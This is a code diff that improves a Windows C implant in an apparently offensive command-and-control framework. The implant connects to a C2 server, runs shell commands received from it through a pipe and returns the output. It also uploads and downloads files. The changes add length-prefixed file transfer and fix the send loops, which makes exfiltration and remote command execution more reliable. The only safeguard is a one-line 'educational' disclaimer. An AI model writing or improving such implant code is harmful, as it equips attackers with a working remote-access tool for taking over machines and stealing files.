@@ -5,10 +5,11 @@ Use educationally/legally.
 */
 #include <ws2tcpip.h>
 #include <stdio.h>
+#include <stdint.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 
-// Length of command buffer.
+// Length of network buffer.
 #define BUFLEN 8192
 
 
@@ -51,15 +52,34 @@ int c2_connect(SOCKET connect_socket, const char *host, const int port) {
 	return 1;
 }
 
+// Function to copy int bytes to new memory location to abide strict aliasing.
+static inline uint32_t ntohl_conv(char const* num)
+{
+	uint32_t new;
+	memcpy(&new, num, sizeof(new));
+	// Return deserialized bytes.
+	return ntohl(new);
+}
+
+
 // Function to receive file from client (TCP file transfer).
 int recv_file(char *buf, char* filename, SOCKET connect_socket) {
 	FILE* fd = fopen(filename, "wb");
 
+	// Receive file size.
+	if (!recv(connect_socket, buf, sizeof(uint32_t), 0))
+		return SOCKET_ERROR;
+
+	size_t f_size = ntohl_conv(&*(buf));
+
+	// Receive all file bytes/chunks and write to parsed filename.
 	int iResult = 1;
-	do {
+	long int total = 0;
+	while (total != f_size && iResult > 0) {
 		iResult = recv(connect_socket, buf, BUFLEN, 0);
 		fwrite(buf, 1, iResult, fd);
-	} while (iResult == BUFLEN);
+		total += iResult;
+	}
 
 	fclose(fd);
 
@@ -71,19 +91,24 @@ int send_file(char *filename, SOCKET connect_socket, char *buf) {
 	// Open file.
 	FILE *fd = fopen(filename, "rb");
 
+	uint32_t bytes = 0;
+	size_t f_size = 0;
+	if (fd) {
+		fseek(fd, 0L, SEEK_END);
+		f_size = ftell(fd);
+
+		bytes = htonl(f_size);
+		fseek(fd, 0L, SEEK_SET);
+	}
+
+	if (!send(connect_socket, (char*)&bytes, sizeof(bytes), 0))
+		return SOCKET_ERROR;
+
 	// Recursively read file until EOF is detected and send file bytes to c2 server in BUFLEN chunks.
 	int iResult = 1;
 
-	char f_found_flag = '\0';
-	if (!fd) {
-		f_found_flag = '1';
-	}
-
-	if (!send(connect_socket, &f_found_flag, 1, 0))
-		return SOCKET_ERROR;
-
-	int bytes_read;
-	if (f_found_flag == '\0') {
+	if (f_size) {
+		int bytes_read;
 		while (!feof(fd) && iResult > 0) {
 			// Recursively read file until end of file (EOF).
 			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
@@ -115,7 +140,7 @@ int exec_cmd(SOCKET connect_socket, char *buf) {
 		do {
 			iResult = send(connect_socket, buf, rb, 0);
 			rb = fread(buf, 1, BUFLEN, fpipe);
-		} while (rb == BUFLEN && iResult > 0);
+		} while (rb && iResult > 0);
 		// Close the pipe stream.
 		_pclose(fpipe);
 	}
@@ -137,7 +162,7 @@ int main(void) {
 		SOCKET connect_socket = create_socket();
 
 		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-           	occurs (connection lost, etc) break the loop and reconnect & restart loop. */
+           occurs (connection lost, etc) break the loop and reconnect & restart loop. */
 		if (connect_socket != INVALID_SOCKET) {
 			int iResult = c2_connect(connect_socket, host, port);
 			while (iResult > 0) {
